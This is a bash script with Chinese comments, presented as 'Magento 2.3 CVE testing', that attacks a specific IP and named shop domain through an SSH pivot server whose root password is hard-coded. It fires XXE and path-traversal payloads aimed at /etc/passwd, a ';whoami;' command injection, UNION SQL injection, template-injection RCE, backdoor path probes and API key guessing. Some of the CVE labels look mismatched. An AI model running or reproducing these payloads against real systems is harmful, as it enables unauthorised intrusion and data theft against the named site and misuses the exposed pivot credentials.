#!/bin/bash
# Magento 2.3 已知CVE测试

TARGET_IP="172.104.189.60"
PIVOT="sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156"

echo "[+] Magento CVE测试"

# CVE-2024-34102 - XXE/RCE
echo -e "\n[CVE-2024-34102] XXE/RCE"
$PIVOT "curl -sk 'http://$TARGET_IP/rest/V1/guest-carts/' -H 'Host: oms.9to9.co.id' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>' 2>&1" | head -20

# CVE-2022-24086 - Arbitrary File Read
echo -e "\n[CVE-2022-24086] 任意文件读取"
$PIVOT "curl -sk 'http://$TARGET_IP/rest/V1/guest-carts/search?searchCriteria[filter_groups][0][filters][0][field]=quote_id&searchCriteria[filter_groups][0][filters][0][value]=../../../../../../etc/passwd&searchCriteria[filter_groups][0][filters][0][condition_type]=eq' -H 'Host: oms.9to9.co.id' 2>&1" | grep -E "root:|www-data:" | head -5

# CVE-2022-24087 - Unauthenticated RCE
echo -e "\n[CVE-2022-24087] 未授权RCE"
$PIVOT "curl -sk 'http://$TARGET_IP/rest/V1/configurable-products/1/child' -H 'Host: oms.9to9.co.id' -H 'Content-Type: application/json' -d '{\"product\":{\"custom_attributes\":[{\"attribute_code\":\"image\",\"value\":\";whoami;\"}]}}' -X POST 2>&1" | head -20

# CVE-2019-8118 - SQL Injection
echo -e "\n[CVE-2019-8118] SQL注入"
$PIVOT "curl -sk 'http://$TARGET_IP/catalog/product/view/id/1%27%20UNION%20SELECT%20VERSION()--' -H 'Host: oms.9to9.co.id' 2>&1 | grep -E '[0-9]+\.[0-9]+\.[0-9]+' | head -3"

# CVE-2019-7139 - Unauthorized Admin Access
echo -e "\n[CVE-2019-7139] 未授权Admin访问"
$PIVOT "curl -sk 'http://$TARGET_IP/admin/Cms/Wysiwyg/directive/index/' -H 'Host: oms.9to9.co.id' 2>&1 | grep -qi 'admin\|dashboard' && echo '✓ 可能存在' || echo '✗ 不存在'"

# CVE-2018-15726 - Magento Connect Backdoor
echo -e "\n[CVE-2018-15726] Backdoor检测"
for path in "/downloader/index.php" "/api.php" "/mage" "/pkginfo" "/.git/config"; do
    echo -n "  $path -> "
    $PIVOT "curl -sk http://$TARGET_IP$path -H 'Host: oms.9to9.co.id' -o /dev/null -w '%{http_code}' 2>&1"
    echo ""
done

# Magento 2.3 RCE via Template
echo -e "\n[Magento 2.3] Template RCE"
$PIVOT "curl -sk 'http://$TARGET_IP/rest/V1/products' -H 'Host: oms.9to9.co.id' -H 'Content-Type: application/json' -H 'Authorization: Bearer xxx' -d '{\"product\":{\"sku\":\"test\",\"name\":\"{{var this.getTemplateFilter().filter(\\\"{{base_url}}{{shell}}\\\")}}\",\"price\":1}}' -X POST 2>&1" | head -15

# Magento API Key Brute
echo -e "\n[Magento] API Key测试"
for key in "test" "admin" "00000000-0000-0000-0000-000000000000" "magento" "api_key"; do
    echo -n "  Key: $key -> "
    $PIVOT "curl -sk 'http://$TARGET_IP/rest/V1/products' -H 'Host: oms.9to9.co.id' -H 'Authorization: Bearer $key' -o /dev/null -w '%{http_code}' 2>&1"
    echo ""
done

echo -e "\n[完成] CVE测试结束"
